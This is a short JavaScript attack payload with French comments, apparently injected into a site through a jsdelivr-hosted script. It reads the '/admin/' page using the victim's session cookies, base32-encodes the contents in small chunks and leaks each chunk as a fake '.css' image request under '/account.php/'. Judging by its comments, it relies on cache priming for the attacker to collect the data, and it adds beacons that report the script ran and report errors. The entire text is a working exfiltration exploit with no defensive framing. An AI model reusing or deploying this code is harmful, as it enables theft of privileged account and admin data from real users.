(async () => {
  const B32 = 'abcdefghijklmnopqrstuvwxyz234567';
  const b32 = (s) => {
    const bytes = new TextEncoder().encode(s);
    let bits = 0, val = 0, out = '';
    for (const b of bytes) {
      val = (val << 8) | b; bits += 8;
      while (bits >= 5) { bits -= 5; out += B32[(val >> bits) & 31]; }
    }
    if (bits > 0) out += B32[(val << (5 - bits)) & 31];
    return out;
  };

  // marqueur de vie: prouve que le JS jsdelivr s'est exécuté
  new Image().src = '/account.php/ALIVE_v1.css';

  try {
    const r = await fetch('/admin/', { credentials: 'include' });
    const t = await r.text();
    // marqueur: taille de la réponse admin (chiffres safe dans un path)
    new Image().src = '/account.php/ADMLEN_' + t.length + '.css';

    // découpe en morceaux courts (chunk 24 octets bruts -> ~40 chars base32)
    const CHUNK = 24;
    const total = Math.ceil(t.length / CHUNK);
    new Image().src = '/account.php/ADMCNT_' + total + '.css';

    for (let i = 0; i < total; i++) {
      const piece = t.substring(i * CHUNK, (i + 1) * CHUNK);
      const url = '/account.php/ADM_' + String(i).padStart(3, '0') + '_' + b32(piece) + '.css';
      // amorçage séquentiel, léger délai pour laisser le cache respirer
      await new Promise((res) => {
        const im = new Image();
        im.onload = im.onerror = res;
        im.src = url;
      });
    }
    new Image().src = '/account.php/DONE_v1.css';
  } catch (e) {
    new Image().src = '/account.php/ERR_' + b32(String(e).slice(0, 60)) + '.css';
  }
})();
